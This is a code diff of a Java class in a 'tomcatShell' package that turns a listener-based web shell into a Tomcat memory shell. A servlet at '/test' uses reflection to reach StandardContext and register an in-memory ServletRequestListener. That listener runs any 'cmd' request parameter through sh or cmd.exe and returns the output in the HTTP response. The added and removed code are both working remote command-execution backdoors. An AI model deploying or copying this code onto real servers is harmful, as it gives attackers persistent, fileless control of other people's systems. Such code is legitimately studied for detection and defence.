@@ -1,67 +1,74 @@
 package tomcatShell.Listener;
 
+import org.apache.catalina.connector.Request;
+import org.apache.catalina.core.ApplicationContext;
+import org.apache.catalina.core.StandardContext;
+import javax.servlet.ServletContext;
+import javax.servlet.ServletException;
 import javax.servlet.ServletRequestEvent;
 import javax.servlet.ServletRequestListener;
-import javax.servlet.annotation.WebListener;
+import javax.servlet.annotation.WebServlet;
+import javax.servlet.http.HttpServlet;
 import javax.servlet.http.HttpServletRequest;
 import javax.servlet.http.HttpServletResponse;
-import java.io.BufferedReader;
+import java.io.IOException;
 import java.io.InputStream;
-import java.io.InputStreamReader;
 import java.lang.reflect.Field;
+import java.util.Scanner;
 
-@WebListener
-public class ListenerShell implements ServletRequestListener {
+@WebServlet("/test")
+public class ListenerShell extends HttpServlet {
     @Override
-    public void requestDestroyed(ServletRequestEvent servletRequestEvent) {
+    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
+        this.doPost(req, resp);
     }
 
     @Override
-    public void requestInitialized(ServletRequestEvent servletRequestEvent) {
-        HttpServletRequest req = (HttpServletRequest)servletRequestEvent.getServletRequest();
-        HttpServletResponse resp = this.getResponseFromRequest(req);
-        String cmd = req.getParameter("cmd");
+    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
         try {
-            String result = this.CommandExec(cmd);
-            resp.getWriter().println(result);
-            System.out.println("部署完成");
+            //这里是反射获取ApplicationContext的context，也就是standardContext
+            ServletContext servletContext = req.getSession().getServletContext();
+
+            Field appctx = servletContext.getClass().getDeclaredField("context");
+            appctx.setAccessible(true);
+            ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);
+
+            Field stdctx = applicationContext.getClass().getDeclaredField("context");
+            stdctx.setAccessible(true);
+            StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);
+
+            ServletRequestListener listener = new ServletRequestListener() {
+                @Override
+                public void requestDestroyed(ServletRequestEvent sre) {
+                }
+
+                @Override
+                public void requestInitialized(ServletRequestEvent sre) {
+                    HttpServletRequest req = (HttpServletRequest) sre.getServletRequest();
+                    try {
+                        if (req.getParameter("cmd") != null) {
+                            boolean isLinux = true;
+                            String osTyp = System.getProperty("os.name");
+                            if (osTyp != null && osTyp.toLowerCase().contains("win")) {
+                                isLinux = false;
+                            }
+                            String[] cmds = isLinux ? new String[]{"sh", "-c", req.getParameter("cmd")} : new String[]{"cmd.exe", "/c", req.getParameter("cmd")};
+                            InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
+                            Scanner s = new Scanner(in).useDelimiter("\\A");
+                            String out = s.hasNext() ? s.next() : "";
+                            Field requestF = req.getClass().getDeclaredField("request");
+                            requestF.setAccessible(true);
+                            Request request = (Request) requestF.get(req);
+                            request.getResponse().getWriter().write(out);
+                        }
+                    } catch (Exception e) {
+                        e.printStackTrace();
+                    }
+                }
+            };
+            standardContext.addApplicationEventListener(listener);
         } catch (Exception e) {
-
+            e.printStackTrace();
         }
-    }
-    public String CommandExec(String cmd) throws Exception {
-        Runtime rt = Runtime.getRuntime();
-        Process proc = rt.exec(cmd);
-        InputStream stderr =  proc.getInputStream();
-        InputStreamReader isr = new InputStreamReader(stderr);
-        BufferedReader br = new BufferedReader(isr);
-        String line = null;
-        StringBuffer sb = new StringBuffer();
-        while ((line = br.readLine()) != null) {
-            sb.append(line + "\n");
-        }
-        return sb.toString();
-    }
-
-    public synchronized HttpServletResponse getResponseFromRequest(HttpServletRequest var1) {
-        HttpServletResponse var2 = null;
-
-        try {
-            Field var3 = var1.getClass().getDeclaredField("response");
-            var3.setAccessible(true);
-            var2 = (HttpServletResponse)var3.get(var1);
-        } catch (Exception var8) {
-            try {
-                Field var4 = var1.getClass().getDeclaredField("request");
-                var4.setAccessible(true);
-                Object var5 = var4.get(var1);
-                Field var6 = var5.getClass().getDeclaredField("response");
-                var6.setAccessible(true);
-                var2 = (HttpServletResponse)var6.get(var5);
-            } catch (Exception var7) {
-            }
-        }
-
-        return var2;
     }
 }
